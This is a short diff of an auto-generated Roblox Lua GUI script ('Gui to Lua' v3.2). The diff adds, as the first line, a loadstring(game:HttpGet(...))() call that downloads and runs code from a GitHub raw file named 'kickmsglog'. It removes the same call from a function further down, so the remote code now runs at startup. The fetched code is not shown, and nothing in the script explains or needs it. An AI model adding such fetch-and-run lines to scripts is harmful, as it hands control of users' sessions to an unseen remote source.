@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/kickmsglog"))()
+wait(0.1)
 -- Gui to Lua
 -- Version: 3.2
 -- Instances:
@@ -223,8 +225,4 @@ else
     local SuperWheat = Instance.new("BoolValue")
     SuperWheat.Name = "ncca"
     SuperWheat.Parent = game.Players.LocalPlayer
-end
-
- local function ASASAS_fake_script()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/kickmsglog"))()
 end
